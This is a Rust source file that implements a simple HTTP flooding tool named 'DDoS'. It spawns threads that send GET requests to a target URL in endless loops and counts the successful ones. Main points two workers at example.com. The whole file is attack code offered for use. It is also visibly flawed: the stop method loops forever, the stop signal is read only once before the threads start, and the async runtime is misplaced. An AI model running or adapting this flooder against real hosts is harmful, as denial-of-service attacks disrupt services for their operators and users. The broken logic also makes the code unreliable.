#![feature(async_closure)]

use std::error::Error;
use std::{thread, time, fmt,ptr};
use futures::future::Future;
use url::{Url, ParseError};
use reqwest;
use std::io::Read;
use tokio::{prelude::*, runtime::Runtime};
use std::time::*;
use std::sync::mpsc;
use std::sync::{Arc, Mutex, MutexGuard};
// macro_rules! unwrap_or_return {
//     ( $e:expr ) => {
//         match $e {
//             Ok(x) => x,
//             Err(_) => return,
//         }
//     }
// }

#[derive(Debug)]
struct DDosError {
    details: String
}

impl DDosError {
    fn new(msg: &str) -> DDosError {
        DDosError{details: msg.to_string()}
    }
}

impl fmt::Display for DDosError {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(f,"{}",self.details)
    }
}

impl Error for DDosError {
    fn description(&self) -> &str {
        &self.details
    }
}
// #[derive(Copy,Clone)]
struct DDoS {
    url: Url,
    stop: mpsc::Receiver<bool>,
    sender: mpsc::Sender<bool>,
    amount_workers: i64,
    success_requests: Arc<Mutex<i64>>,
}
fn build_url(s: &str) -> Result<Url,ParseError> {
    let url = Url::parse(s)?;
    Ok(url)
}
#[tokio::main]
async fn make_request(url: &String,success_requests:  &Arc<Mutex<i64>>) -> Result<(), reqwest::Error> {
        let res = reqwest::get(url).await?;

        let body = res.text().await?;
        *success_requests.lock().unwrap() += 1;
        Ok(())
}
impl DDoS {
    fn new(url: &str, workers: i64) -> Result<DDoS, DDosError> {
        if workers < 1 {
            return Err(DDosError::new("Not enough workers."));
        }
        let data_url = build_url(url).unwrap();
        
        if data_url.host() == None {
            return Err(DDosError::new("Undefined host."));
        }
        let (sender, receiver) = mpsc::channel();
        Ok(DDoS {
            url: data_url,
            stop: receiver,
            sender: sender,
            amount_workers: workers,
            success_requests: Arc::new(Mutex::new(0)),
        })

    }
    fn stop(&self) {

        let clone_sender = &self.sender.clone();
        for _ in 0..self.amount_workers {
            println!("STOPP");
            loop {

                    clone_sender.send(true).unwrap();
                }
          }
    }
    fn run(&mut self) {
        let local_workers = self.amount_workers.clone();

        for _ in 0..local_workers {
            let url = self.url.clone().to_string();
            println!("{:?}",url );
            let should_stop = self.stop.try_iter().next();
            let num_clone = self.success_requests.clone();
            println!("Otside of thread {:?}",should_stop );

            thread::spawn(move || {
                println!("{:?}",should_stop );
                println!("In new thread");
                loop {
                    if should_stop == Some(true) {
                        break;
                    }
                    make_request(&url, &num_clone);
                    println!("Success requests == {:?}",&num_clone );
                    // self.success_requests.fetch_add(1, Ordering::SeqCst);
                }
            });
        }

    }
    fn result(&mut self) -> i64 {

        *self.success_requests.lock().unwrap()
    }
}
fn main() {
    let mut ddos: DDoS = DDoS::new("http://example.com", 2).unwrap();
    ddos.run();
    thread::sleep(Duration::from_millis(4000));
    let result = ddos.result();
    println!("RESULT IS ==== {:?}",result);

    loop {

        // thread::sleep(Duration::from_millis(5000));
    }
}
